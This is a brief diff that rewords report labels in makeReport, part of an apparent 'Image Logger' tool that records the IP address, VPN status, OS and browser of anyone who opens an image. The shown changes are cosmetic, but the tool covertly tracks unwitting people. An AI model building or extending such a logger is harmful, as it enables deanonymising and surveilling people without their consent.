@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A User Opened the Image In Their Browser!**
 
 **Endpoint:** `{endpoint}`
             
@@ -163,7 +163,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**PC Info:**
+**Device Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
